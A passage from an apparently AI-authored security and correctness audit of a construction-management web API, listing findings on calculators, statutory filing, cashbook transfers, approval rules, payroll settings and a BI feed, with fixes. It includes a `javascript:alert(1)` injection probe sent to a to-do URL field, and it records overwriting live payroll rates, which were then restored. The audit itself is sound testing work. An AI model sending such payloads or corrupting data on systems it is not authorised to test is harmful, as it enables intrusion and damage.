POST … {"x_coordinate":10,"y_coordinate":10,"created_by":"<users.id>"}                          → 500
POST … {"x_coordinate":99999,"y_coordinate":-500,"comment":"ZZ off"}                            → 500
```

**(a) Coordinate overflow.** `models.py:388-389` declares:

```python
    x_coordinate = Column(Numeric(6, 2), nullable=False)
    y_coordinate = Column(Numeric(6, 2), nullable=False)
```

`Numeric(6,2)` holds at most `9999.99`. A coordinate of `99999` raises
`NumericValueOutOfRange` in Postgres, which surfaces as a bare 500. The schema has no `ge`/`le`
bounds, so the API advertises no limit and the database enforces one by crashing. Negative
coordinates are accepted by the column but are meaningless on a drawing canvas.

**(b) `created_by` is the third untyped-UUID instance.** `DrawingPin.created_by` references
`company_team.id` (`models.py:392`); passing a `users.id` produces the same `ForeignKeyViolation` 500
as R2-270's chat groups and the same class as R2-231's payments. Three confirmed instances in one
round makes this a structural issue rather than three bugs.

### Fix
Bound the coordinates in the schema (`ge=0`, `le=9999.99`, or normalise to 0–1 fractions of the
drawing, which is the more robust representation), derive `created_by` from the authenticated user,
and add R2-236's catch-all so a constraint violation returns a 4xx that names the field.

## FINDING R2-278 — 🟡 MEDIUM: a to-do accepts a `javascript:` URL, another member as its author, and a due date six years in the past

```
POST /todos/ {"title":"ZZ R5 Todo","repeat_type":"daily","due_date":"2020-01-01",
              "created_by":"331b67d5-…","url":"javascript:alert(1)"}
→ 200 {"url":"javascript:alert(1)","created_by":"331b67d5-…","due_date":"2020-01-01T00:00:00+00:00"}
```

- **`url` has no scheme validation** — the same gap as R2-257 and the drawings module. **No render
  path was found for this field** in the console (a grep for an `href` fed from a to-do `url` returned
  nothing), so **this is not currently exploitable and is filed as MEDIUM, not as a second XSS.** It
  becomes one the moment someone makes the field clickable, which is plainly what it is for.
- **`created_by` accepts any member id** — ninth site of the caller-supplied identity pattern. It is
  UUID-typed, so `"ZZ NOT ME"` was correctly rejected with 422; a real colleague's id was not.
- **`due_date` in 2020** — a to-do created already overdue. Fourth instance of an unbounded past date
  (NCR R2-246, safety `reported_at` R2-256, CRM `expected_closure` R2-273).

`repeat_type: "daily"` was accepted and stored; whether recurrence actually generates anything remains
the open "captured but never consumed" question for to-dos, and could not be settled in one session.

**Register: 278 findings, R2-001 → R2-278, no gaps.** Round 5 contributed **48** (R2-231 → R2-278).
Docs-only, ~14 commits this round, **never pushed**. Branch `claude/siteflow-audit-round-5-c53b63`,
byte-identical copy in `siteflow-continuation-acc389`, md5-verified after every batch.

| | Round 5 | Register |

## Did Round 5 do its job?
The objective was to move **semantic coverage** from ~34%. It is now **≈90%** of the 190 mutating call
sites, and the return justified the method: Round 4 projected ~20 findings remaining and found 14% of
its findings CRITICAL; Round 5 filed **48** at **31% CRITICAL**. Seeding data with shape was the
reason — every CRITICAL came from comparing two numbers that only exist once the data is non-trivial.

## The five things to fix first, in order
Each is one job that closes many findings.

1. **Ban `datetime.utcnow()`.** 8 sites; 3 take a whole feature offline — every punch-out 500s and
   deadlocks the worker (R2-262/R2-210), any machine on site 500s the project P&L (R2-244), the
   ledger 500s (R2-236, hypothesis). One lint rule plus a sweep. Also unblocks R2-201 and R2-203.
2. **Add a catch-all exception handler** that logs, reports to Sentry, and returns JSON **through**
   the CORS middleware (R2-236). Today an unhandled 500 reaches the browser as
   `TypeError: Failed to fetch`, so the console cannot tell a crash from being offline. This cost
   the audit time twice and will pay for itself on the first production incident.
3. **One shared `invoice_type` to cost-head mapping.** 7 sites; closes R2-153, R2-229, R2-036,
   R2-081, R2-233, R2-238, R2-243, R2-250, R2-267. Today four financial surfaces partition four cost
   types four ways and **no two agree** — including the Tally export booking receipts as purchases.
4. **Derive every actor field from the authenticated user** and delete them from request schemas.
   9 sites. `POST /budgeting/boq-documents/{id}/revisions` already does it correctly — copy that.
5. **Stop passing bare UUIDs of three different types.** `users.id`, `company_team.id` and
   `library_parties.id` are interchangeable at every call site. Three confirmed breakages this round
   (R2-231 silent, R2-270 loud, R2-277 loud), one auditor false start, and `Party: N/A` on invoices.

## What Round 5 proves about the product, in one paragraph
Input validation on **numbers and enums** is consistently good — a dozen deliberate bad-scalar probes
were all correctly rejected. Validation of **strings** is essentially absent: URLs take any scheme
(R2-257 stored XSS, R2-278), phone and email are free text (R2-273), and load-bearing status columns
like `Bill.status` (R2-232) and `incident_type` (R2-252) are unconstrained — the latter silently drops
a fatality out of the statutory safety metric. Validation of **relationships between records does not
exist at all**: received vs ordered, billed vs ordered, wasted vs available, consumed vs available,
closed vs reviewed, items vs total, done vs total, actor vs caller, tower vs project. The three
largest findings are not missing `if` statements but **missing columns** — no `tower_id` on
Bill/PO/WorkOrder, no `wo_id` on Bill, no cap on `received_qty` — so they scope as migrations. There
are exactly two counter-examples in the whole product, and both are worth reading before writing the
fixes: the Gantt predecessor endpoint rejects dependency cycles and self-reference with clear
messages, and the BOQ revision endpoint derives its actor server-side.

# 🧮 ROUND 5 BATCH 12 — the quantity calculators

Fourteen calculator endpoints, none previously exercised numerically. These are pure functions, so
every answer can be checked by hand — the strongest possible evidence, with no data-shape caveats.

**Verified correct first**, so the failures below are read against a working baseline:

| Calculator | Input | Output | Hand check |
|---|---|---|---|
| `tile` | 10×10 ft room, 12"×12" tiles, 0% wastage | 100 tiles, 100 sqft | 100 sqft ÷ 1 sqft = 100 ✅ |
| `waterproofing` | 600 sqft, 60 sqft/L, 2 coats | 20 L | 600/60 × 2 = 20 ✅ |
| `split-rate` | 10 × ₹100 supply @18%, ₹50 install @12% | supply tax 180, install tax 60, total 1,740 | ✅ exact |
| `concrete` sand/aggregate | 10 m³ M20 | 4.2 m³ / 8.4 m³ | 1.54×1.5/5.5 and ×3/5.5 ✅ |

## FINDING R2-279 — 🟠 HIGH: the brickwork calculator ignores wall thickness when counting bricks, so a 230 mm wall is quoted the same brick count as a 115 mm wall

`backend/app/routers/calculators.py:216-227`:

```python
    b_len = (req.brick_length_mm + req.joint_mm) / 1000.0
    b_hgt = (req.brick_height_mm + req.joint_mm) / 1000.0

    wall_area = req.length_m * req.height_m
    single_brick_face_area = b_len * b_hgt
    bricks_needed = (wall_area / single_brick_face_area) * req.leaves * (1 + req.wastage_pct / 100.0)

    wall_volume = req.length_m * req.height_m * (req.thickness_mm / 1000.0)
```

`thickness_mm` appears **only** in `wall_volume`, which feeds mortar. The brick count is
`face area × leaves` and never sees the thickness. Confirmed across a sweep of a 10 m × 3 m wall at
0% wastage:

| thickness_mm | leaves | bricks_needed | wall_volume_m3 | mortar_volume_m3 | mortar as % of wall |
|---|---|---|---|---|---|
| 230 | 1 | **1,500** | 6.90 | 4.592 | **67%** |
| **115** | 1 | **1,500** | 3.45 | 1.142 | 33% |
| 230 | 2 | 3,000 | 6.90 | 2.283 | 33% |
| **460** | 2 | **3,000** | 13.80 | 9.183 | **67%** |

**Rows 1 and 2 are the finding**: doubling the wall thickness changes nothing about how many bricks
are needed. Rows 3 and 4 show the same for a 460 mm wall.

The physical answer for a 230 mm wall of 6.9 m³ is roughly 3,450 bricks (≈500 per m³). The calculator
returns **1,500 — a 57% under-order** — and then reports that the remaining 67% of the wall is
mortar, which is not a wall.

The two halves of the function describe the same wall from different inputs (`leaves` for bricks,
`thickness_mm` for volume) and nothing reconciles them. It is the round's central thesis appearing in
a pure function with no database involved.

### Fix
Derive the number of leaves from `thickness_mm` and the brick dimensions
(`leaves = round(thickness_mm / (brick_width_mm + joint_mm))`), or drop `thickness_mm` from the
request and compute the volume from `leaves`. Do not accept both as independent inputs. Add a sanity
assertion that mortar is between roughly 20% and 35% of wall volume and fail loudly outside it.

## FINDING R2-280 — 🟠 HIGH: calculators return negative material quantities — negative bags of cement, negative litres of paint — as ordinary 200 responses

Two calculators produce negative outputs from in-range-looking inputs. Neither bounds the parameter
that causes it.

**Brickwork, `leaves: 99`** (the field has no upper bound; `calculators.py:211` declares
`leaves: int = Field(2, example=2)`):

```json
{"wall_area_m2":30.0,"wall_volume_m3":6.9,"bricks_needed":148500,
 "mortar_volume_m3":-221.641,"cement_bags":-1212.82,"sand_m3":-252.671}
```

Because `mortar_volume = wall_volume − net_bricks × brick_vol_actual` (`:227`) with no floor, and
cement and sand are proportional to it (`:229-236`), the answer is **−1,212 bags of cement**.

**Paint, 99 doors and 99 windows in a 10 × 10 ft room:**

```json
{"paintable_area_sqft":-2767.0,"paint_litres":-0.0,"putty_kg":-68.48,"primer_litres":-16.6}
```

The openings are subtracted from the wall area with no check that they fit, giving a room with
**−2,767 sqft** of wall.

Both return HTTP 200 with `Content-Type: application/json` and no warning. A negative quantity is not
a large error or a small one — it is a signal that the model has broken down, and it is being handed
to the user as a result.

### Fix
Bound the inputs (`leaves` 1–4; total opening area < wall area), and clamp every material output at
zero with an explicit error when a computation goes negative. A shared
`assert_non_negative(result)` at the end of each calculator would have caught both.

## FINDING R2-281 — 🟠 HIGH: the concrete calculator's wastage input changes the displayed dry volume but has no effect on the materials to order

`calculators.py:113` and `:130-132`:

```python
    dry_volume = wet_volume * 1.54 * (1 + req.wastage_pct / 100.0)
    ...
    cement_bags = wet_volume * mix_library[req.grade][0]
    sand_m3     = wet_volume * mix_library[req.grade][1]
    aggregate_m3 = wet_volume * mix_library[req.grade][2]
```

`dry_volume` is computed, returned, and **never used**. The three material figures are looked up from
a per-**wet**-cubic-metre table, so the wastage percentage cannot reach them. Confirmed by sweep on
10 m³ of M20:

| `wastage_pct` | `dry_volume_m3` | `cement_bags` | `sand_m3` | `aggregate_m3` |
|---|---|---|---|---|
| 0 | 15.40 | 82.0 | 4.2 | 8.4 |
| 5 | 16.17 | **82.0** | **4.2** | **8.4** |
| 50 | 23.10 | **82.0** | **4.2** | **8.4** |
| 500 | 92.40 | **82.0** | **4.2** | **8.4** |

At 500% wastage the response claims 92.4 m³ of dry material is required and simultaneously that 4.2 m³
of sand should be ordered — **the same response contradicts itself by a factor of six**, and the
default wastage of 5% means every ordinary use of this calculator under-orders by 5%.

This is the eighth member of the **"captured but never consumed"** pattern, and the first one where
the ignored input is displayed back to the user as though it had been applied.

### Fix
Derive cement, sand and aggregate from `dry_volume` and the grade's true ratio
(`dry_volume × part / total_parts`, and cement bags via `× 1440 / 50`) — which is exactly what
`calc_brick` and the plaster calculator already do at `:231` and `:344`. Three calculators in one
file, two correct, one not.

## FINDING R2-282 — 🟡 MEDIUM: the steel calculator accepts two competing parameter sets and silently uses the legacy one; house-cost quotes ₹0 for a building with zero floors

**(a) Steel — duplicate parameters, silent precedence.** `SteelCalcRequest` carries both a legacy
triple (`diameter`, `count`, `length_or_height`) and a newer, clearer triple (`diameter_mm`,
`num_bars`, `length_m`). Sending both:

```
{"diameter":12,"count":10,"length_or_height":6, "diameter_mm":25,"num_bars":100,"length_m":12}
→ {"unit_weight_kg_m":0.884, "cutting_length_m":1.248, "total_weight_kg":11.58}
```

`0.884 kg/m` is the unit weight of a **12 mm** bar (12²/162). The 25 mm / 100-bar / 12 m figures were
silently discarded — a 25 mm bar weighs 3.85 kg/m, so the answer is off by more than 4× for anyone who
populated the newer fields. Neither the schema nor the response indicates which set won. A caller
migrating to the newer field names, or a UI that sends both, gets a confidently wrong number.

**(b) House cost — zero floors, zero rupees.**

```
{"area_sqft":1000,"floors":0} → {"base_construction_cost":0.0, "total_project_cost":0.0,
                                 "contingency_buffer":0.0, "splits":{…all 0.0}}
```

`floors` is unbounded below at zero, and the cost is multiplied by it, so a 1,000 sqft house is quoted
**₹0**. This is the calculator most likely to be used by a prospective customer.

### Fix
Deprecate one steel parameter set and reject requests that populate both (or document precedence and
echo which was used); bound `floors` at `ge=1` and `area_sqft` at `gt=0`.

## Probes that found the product CORRECT — batch 12

| Probe | Result |
|---|---|
| `wet_volume: -10` on concrete | 422 with a helpful message: *"wet_volume must be >= 0 (use staircase fields for stair volumes)"* ✅ |
| `grade: "M9999"` | 422, pattern `^(M5\|M7\.5\|M10\|M15\|M20\|M25\|M30\|M35\|M40\|M45)$` ✅ |
| `grade: "M30"` (valid pattern, absent from `mix_library`) | Returns `engineered_design_mix_required: true` and omits the material figures — a deliberate, correct refusal to guess ✅ |
| Calculator auth | All 14 require a bearer token; unauthenticated calls return 401 ✅ (they are **not** the public marketing calculators) |
| `tile`, `waterproofing`, `split-rate`, concrete sand/aggregate | Exact to hand calculation ✅ |

The concrete endpoint is a good illustration of the round's overall picture in miniature: its **input
validation is excellent** — a bounded pattern, a negative check with an explanatory message, and an
honest refusal for grades it cannot model — while its **arithmetic silently ignores one of its own
inputs**. Guarding the front door well is not the same as being right.

## Round 5 seeded data — batch 12

None. All fourteen calculator endpoints are pure functions and write nothing.

# 🏛️ ROUND 5 BATCH 13 — Statutory, approvals, cashbook, reports

## FINDING R2-283 — 🔴 CRITICAL: the statutory compliance module cannot create a single record — every write 500s because the code passes a column that does not exist

**PF, ESI, BOCW and TDS return filing is entirely non-functional.** Every `POST /apis/v3/statutory`
returns a bare 500, on every payload tried:

```
POST /statutory {"company_id":…,"report_type":"PF","return_period":"2026-07"}                → 500
POST /statutory {… ,"status":"filed"}                                                        → 500
POST /statutory {… ,"filed_by":"<valid uuid>"}                                               → 500
POST /statutory {… ,"filed_by":"ZZ NOBODY", pf/esi figures, acknowledgment_number}            → 500
GET  /statutory/{company_id}                                                                 → 200 []
GET  /statutory/{company_id}/auto-populate?report_type=PF&return_period=2026-07              → 500
```

The list endpoint returning an **empty array** is the tell: after five rounds of auditing and however
long in production, **not one statutory report has ever been successfully created.**

### Cause 1 — `due_date` is not a column on the model
`statutory.py:101-103`:

```python
    if not data.get("due_date"):
        data["due_date"] = calculate_due_date(data["report_type"], data["return_period"])
    report = StatutoryReport(**data)
```

`StatutoryReport` (`models.py:1706-1727`) has `filed_at`, `filed_by`, `acknowledgment_number`,
`status`, `created_at`, `updated_at` — and **no `due_date` column at all**. `StatutoryReport(**data)`
therefore raises `TypeError: 'due_date' is an invalid keyword argument for StatutoryReport()` before
anything reaches the database. This is unconditional, which is exactly what the sweep above shows.

The response schema declares `due_date: Optional[datetime] = None` (`statutory.py:52`) and the
request schema accepts it, so **three layers disagree about whether this field exists.**

### Cause 2 — `_enrich` reads the same missing column, and uses a naive `utcnow()`
`statutory.py:342-352`:

```python
def _enrich(report: StatutoryReport, db: Session) -> StatutoryReportResponse:
    days_overdue = 0
    penalty = 0.0
    if report.due_date:
        if report.status != "filed":
            days_overdue = max(0, (datetime.utcnow() - report.due_date).days)
```

Two defects stacked: `report.due_date` does not exist, and if it did, `datetime.utcnow()` is naive
while every datetime column in this model is `timezone=True` — the **ninth site** of the R2-222 class.
`GET /statutory/{company_id}` returns `200 []` only because the list is empty and the loop never runs;
the moment a single row existed, the list endpoint would 500 as well.

### Cause 3 — the response model makes three nullable fields mandatory
`statutory.py:48-50`:

```python
    filed_at: Optional[datetime]
    filed_by: Optional[str]
    acknowledgment_number: Optional[str]
```

In Pydantic v2, `Optional[X]` **without** `= None` is a *required* field that merely permits `None`.
Any code path that builds the response from a dict lacking those keys fails validation. That is
precisely the error sitting on the Sentry board:

```
ValidationError — 3 validation errors for StatutoryReportResponse
  filed_at Field required · filed_by Field required · acknowledgment_number Field required
  [type=missing, input_value={'company_id': UUID('d372…}]
PYTHON-FASTAPI-E  Unhandled  /apis/v3/statutory/{company_id}/auto-populate
```

Unlike R2-270's chat error, this one is *both* captured and diagnostically complete — it names the
three fields and the endpoint. It had still not been acted on.

### This closes an open question from four rounds
**R2-126 through R2-130** (statutory output correctness) and **R2-197** (ESI flag) have been carried
as "unexercised, needs non-zero payroll numbers" since Round 3. They were never testable for a much
simpler reason: **the module cannot store a record.** The Round 4 handoff's seeding step 4 assumed
attendance was the blocker; attendance (R2-262) is *a* blocker, but even with perfect payroll data
there is nothing to write the statutory return into.

### Severity
🔴 CRITICAL. Statutory returns are a legal obligation with penalties for late filing, and the module
advertised to manage them has never worked. The product also computes a `penalty_estimate` for
overdue filings — a feature that presupposes records that cannot exist.

### Fix
1. Add a `due_date` column to `StatutoryReport` (with a migration), or stop passing it to the
   constructor and compute it on read. Pick one and make the model, the request schema and the
   response schema agree.
2. `filed_at: Optional[datetime] = None` — and the same for the other two.
3. `datetime.now(timezone.utc)` in `_enrich`.
4. A single smoke test that creates a report and lists it would have caught all three.

## FINDING R2-284 — 🟠 HIGH: a party-to-party cash transfer can be made from a party to itself, creating two payment records out of nothing

```
POST /cashbook/p2p {"sender_company_user_id":"e9db5738-…",
                    "receiver_company_user_id":"e9db5738-…",   ← the same party
                    "amount":50000,"payment_date":"2026-07-27T00:00:00Z"}
→ 201 {"sender_payment_id":"33459662-…","receiver_payment_id":"39da9c9e-…","status":"Success"}
```

No check that sender and receiver differ. The transfer creates **two `Payment` rows for ₹50,000** —
one out, one in — attributed to the same party. The party's net balance is unchanged, which is why it
is easy to miss, but every gross figure derived from payments is inflated by ₹50,000 on both sides:
cash-in, cash-out, transaction counts, party turnover, and any period cash-flow report.

Repeated, this is an arbitrarily large inflation of apparent cash movement with zero net effect —
which is the shape of a metric-manipulation vector, not merely a typo.

### Fix
Reject `sender_company_user_id == receiver_company_user_id` with a 422. While there, reject
`amount <= 0` if not already bounded, and consider requiring both parties to belong to the company
named in the request.

## FINDING R2-285 — 🟠 HIGH: an approval rule can be created that can never match and that requires zero approvals

```
POST /settings/approval-rules/{company_id}
  {"feature_type":"bill","min_amount":100000,"max_amount":100,"levels":0,
   "approvers":"d3724ec3-edac-4b5f-b296-fc6a013b7b5d"}
→ 200 {"min_amount":100000.0,"max_amount":100.0,"levels":0,"approvers":"d3724ec3-…"}
```

Three problems in one accepted record:

1. **`min_amount` (₹1,00,000) exceeds `max_amount` (₹100).** The band is empty — no amount can ever
   satisfy `min <= x <= max`. The rule is stored and will silently never fire, so a company that
   configures approvals believes bills above ₹1 lakh need sign-off and they never do.
2. **`levels: 0`.** A rule requiring zero approval levels. Combined with R2-132 (an over-billing
   returning `pending`) and R2-090 (approvals ignoring a 403), the approval subsystem can be
   configured into a no-op without any warning.
3. **`approvers` is a free-text string**, not a list of member ids — it accepted a **company id**,
   which is not an approver of anything. There is no validation that the value names a real person.

Note this endpoint returns **200** for a creation, like `POST /projects/` and `POST /mom/{company_id}`.

### Fix
Validate `max_amount > min_amount` (or allow a null max for open-ended), `levels >= 1`, and parse
`approvers` into a list of `company_team` ids that are verified to exist in the company. Reject
overlapping bands for the same `feature_type` while you are there — nothing currently prevents two
rules from claiming the same amount.

## FINDING R2-286 — 🟡 MEDIUM: a generated report advertises a PDF URL that 404s, and its author can approve it

**(a) The advertised URL is dead.**

```
POST /reports/generate/{project_id} → 201 {"pdf_url":"/static/reports/a85495b9-….pdf", …}
GET  https://<api-host>/static/reports/a85495b9-….pdf              → 404
GET  /apis/v3/reports/{report_id}/download                          → 200, application/pdf, 1,755 B
```

The record hands the client a path that does not resolve; the working route is a different one. Any
UI or email that links `pdf_url` produces a broken link, and the failure is a plain 404 with no
indication that a working alternative exists.

**(b) Self-approval.** `PATCH /reports/{report_id}/approve` was called by the same user who generated
the report, moments later, and returned `is_approved: true`. There is no separate approver, no record
of who approved, and no check that the approver differs from the author. This is the **eighth**
distinct approval mechanism catalogued in this register, and the fourth that permits self-approval
(R2-246 NCR, R2-256 safety incident, R2-259 drawing revision, this).

### Fix
Return the working download path in `pdf_url` (or drop the field), and require an approver distinct
from `created_by`, recording their id and a timestamp.

## FINDING R2-287 — 🟡 MEDIUM: a party's opening balance is accepted and never applied

```
POST /projects/{project_id}/parties
  {"party_id":"5da395a5-…","opening_balance_direction":"to_receive","opening_balance_amount":50000}
→ 200 {"party_id":"5da395a5-…","balance":0.0,"advance_paid":0.0,"to_pay":0.0,"status":"Active"}
```

An opening balance of ₹50,000 receivable was supplied and the party's balance came back **0.00** in
the same response. A negative amount (`-99999`) is likewise accepted and likewise ignored.

Opening balances exist so a company can start using the product mid-relationship without losing what
is already owed. Silently discarding them means every party starts from zero and the ledger disagrees
with reality from day one — and because the field is accepted with a 200, the user has no reason to
check.

Ninth member of the **"captured but never consumed"** pattern.

### Fix
Apply the opening balance as a ledger entry at the party-project link, signed by
`opening_balance_direction`, and include it in the balance computation of R2-235. Reject a negative
amount — direction is already a separate field.

|---|---|
| `approvers: []` (a list) on an approval rule | 422 — the field is typed as a string, so the list was rejected. Correct *typing*, wrong *type choice* (see R2-285) |
| `GET /reports/{id}/download` | 200, `application/pdf`, valid file ✅ |
| `GET /statutory/{company_id}` | 200 with an empty list rather than an error ✅ (though only because no row can exist) |

# ⚙️ ROUND 5 BATCH 14 — Settings, and the BI feed unblocked

## FINDING R2-288 — 🔴 CRITICAL: statutory payroll percentages are completely unbounded — a 999% PF deduction and a negative employer contribution are both accepted

`PUT /apis/v3/settings/payroll/{company_id}` writes the rates every payslip is computed from. None of
them is bounded.

```
Before: {"pf_employee_pct":12.0,"pf_employer_pct":12.0,"esi_employee_pct":0.75,
         "esi_employer_pct":3.25,"tds_monthly":0.0,"is_esi_applicable":true}

PUT {"pf_employee_pct":999,"pf_employer_pct":-50,"esi_employee_pct":500,"tds_monthly":-1000}
→ 200 {"pf_employee_pct":999.0,"pf_employer_pct":-50.0,"esi_employee_pct":500.0,
       "esi_employer_pct":3.25,"tds_monthly":-1000.0,"is_esi_applicable":true}
```

Every value was stored verbatim:

| Field | Statutory value | Accepted | Effect on a payslip |
|---|---|---|---|
| `pf_employee_pct` | 12% | **999** | deducts 999% of basic — net pay hugely negative |
| `pf_employer_pct` | 12% | **−50** | a *negative* employer contribution, i.e. the employer takes money back |
| `esi_employee_pct` | 0.75% | **500** | 500% of gross |
| `tds_monthly` | ≥ 0 | **−1000** | negative tax — a refund the company never received |

These are not free-form business settings, they are **statutory rates fixed by law**. There is no
legitimate value of `pf_employee_pct` above ~12, none below 0, and a negative TDS is not a number that
exists. The field is a single company-wide setting, so one bad edit corrupts **every employee's
payslip in the next run**, and per R2-201 payroll will happily produce those payslips.

This compounds the statutory findings already open: R2-283 (the statutory module cannot store a
return), R2-197 (the ESI applicability flag), and R2-262 (attendance hours never recorded). The
inputs, the computation and the filing are all defective independently.

### Severity
🔴 CRITICAL — it silently corrupts every future payslip and every statutory contribution figure
derived from them, from a settings screen that offers no confirmation.

### Fix
Bound each field (`pf_employee_pct` 0–12, `pf_employer_pct` 0–12, `esi_employee_pct` 0–1,
`esi_employer_pct` 0–5, `tds_monthly` ≥ 0), seed them from the statutory defaults, and require an
explicit confirmation for any change — these should be edited roughly never.

### Auditor disclosure
The settings were read before the test, overwritten, and **restored to the exact original values in
the same minute** (verified: a follow-up `GET` returns `12.0 / 12.0 / 0.75 / 3.25 / 0.0 / true`). No
payroll run occurred in the interval.

## FINDING R2-289 — 🟠 HIGH: the BI analytics feed omits `expense` and `equipment` bills, and disagrees with the Budget module on the same project

**This closes a blocked item.** The BI feed has been carried as untestable since Round 4 because it
requires an API key rather than a bearer token. A key was created through the product
(`POST /integrations/bi/companies/{company_id}/keys`), the three feeds were pulled, and the key was
revoked immediately afterwards (disclosure below).

`GET /integrations/bi/feed/{company_id}/budget-variance`:

```csv
project_id,name,material_budget,…,material_actual,subcon_actual,labour_actual,equipment_actual,total_actual,total_variance
a1376092…,Zoho Test Project,0.0,…,24600.0,111100.0,44113.84,209946.063296,389759.903296,-389759.903296
4ab9616c…,ZZ QA R5 Second Project,0.0,…,12154.0,590000.0,0.0,0.0,602154.0,-602154.0
```

**On the clean project**, whose entire contents were created by this audit:

| Cost | Real | In the feed |
|---|---|---|
| `purchase` bills | ₹12,154 | ✅ 12,154 |
| `subcon` bill | ₹5,90,000 | ✅ 590,000 |
| `equipment` bill (`ZZ-R5-EQP-1`) | ₹23,600 | ❌ **missing** |
| `expense` bill (`ZZ-R5-EXP-1`) | ₹35,400 | ❌ **missing** |
| **Total** | **₹6,61,554** | **₹6,02,154** |

**₹59,000 absent.** `bi_export.py:257-263` filters `Bill.invoice_type == "purchase"` and
`== "subcon"` and nothing else — the same literal-string mistake as `budget.py` (R2-233). This is the
**eighth site** in the `invoice_type` cross-cutting pattern. The prediction recorded in the Round 5
handoff ("predicted to have the same gap — unverified") is confirmed.

**And it disagrees with Budget.** For the old project the BI feed reports
`equipment_actual: 209,946.06`, computed from equipment deployments and fuel logs. The Budget module
reports `equipment_actual: 0.0` for the same project, because `budget.py:101` hardcodes it. Two
company-facing surfaces give answers **₹2.1 lakh apart** for the same quantity on the same project,
and the BI feed is the one a customer would wire into Power BI or Metabase and treat as canonical.

That makes **five** distinct partitions of the same cost data now catalogued — Budget, P&L, Towers,
Tally export, BI feed — with no two agreeing.

### Also noted in the same sweep
- `labour-productivity` reports `total_hours_worked: 8.0` across 2 attendance logs for the old
  project, averaging 4.0 per log. One of those logs is the row stranded open by R2-262 with
  `hours_worked: null`; it is counted in the denominator but contributes nothing to the numerator, so
  the average per *worked* log is understated by half. Minor, but it is R2-262 leaking into analytics.
- The `projects` feed carries no financial columns at all, only descriptive ones plus `health`.

### Fix
Use the shared `EXPENSE_INVOICE_TYPES` constant (or better, the single cost-head mapping proposed in
the Round 5 handoff) in `bi_export.py`, and reconcile equipment cost to one definition across Budget,
P&L and BI.

### Auditor disclosure — an API key was created and revoked
`POST /integrations/bi/companies/{company_id}/keys` returned a key in plaintext
(`{"id":"2c21ccf8-…","label":"ZZ R5 audit key","key":"siteflow_bi_…"}`). It was used for three read-only
GETs and then revoked via `DELETE /integrations/bi/companies/{company_id}/keys/{key_id}` → `200
{"ok":true,"revoked":true}`. Revocation was **verified** by re-issuing the feed request with the same
key: `401 {"detail":"Invalid or revoked API key"}`. **No BI key created by this audit is live.**

Two observations about the key mechanism, both **correct** and worth recording: the key is returned
once at creation (not retrievable later), and the feed accepts it via either `X-API-Key` or
`Authorization: Bearer`, rejecting an unknown header name with a message that names both accepted
forms. That is better-designed than most of the surfaces audited this round.

## FINDING R2-290 — 🟡 MEDIUM: a branch accepts an invalid GSTIN, and a salary template's components can total 250% of salary

**(a) GSTIN is unvalidated free text.**

```
POST /settings/branches/{company_id} {"branch_name":"ZZ R5 Branch","gstin":"NOT-A-GSTIN","billing_address":"ZZ"}
→ 200 {"gstin":"NOT-A-GSTIN","is_primary":true, …}
```

A GSTIN has a fixed 15-character structure (`\d{2}[A-Z]{5}\d{4}[A-Z]\d[Z][A-Z\d]`). This one is a
required field on the branch — it is the number that identifies the supplier on every tax invoice
raised from that branch, and it is stored with no format check at all. Combined with R2-272 (the
invoice PDF prints no GSTIN today), the field is both unvalidated and unused, so nothing will surface
the error until an invoice is rejected.

Another instance of the round's corrected thesis: **numeric validation good, string validation
absent.**

**(b) A salary template's breakup can exceed the whole salary.**

```
POST /settings/salary-templates/{company_id} {"name":"ZZ R5 Template","breakup":{"basic":150,"hra":50,"other":50}}
→ 201 {"breakup":{"hra":50,"basic":150,"other":50}, "status":"Active"}
```

The components total **250%**. A salary breakup is by definition a partition of gross pay; nothing
checks that the parts sum to 100, and the template is stored `Active` and available for use. Since
`basic` drives the PF calculation, a template like this inflates statutory contributions as well as
the payslip.

### Fix
Apply a GSTIN regex (and verify the state code matches the branch state); validate that a salary
breakup sums to 100 within a small epsilon, rejecting anything else.

|---|---|
| BI key returned once at creation, not retrievable afterwards | ✅ correct design |
| BI feed accepts `X-API-Key` **or** `Authorization: Bearer`; unknown header → 401 naming both | ✅ |
| BI key revocation | Immediate and verified — reused key returns 401 ✅ |
| Payroll settings round-trip | Restored values read back exactly ✅ |
| First branch created becomes `is_primary: true` | Sensible default; there was no prior branch to demote, so **no finding** — recorded so it is not re-derived as one |
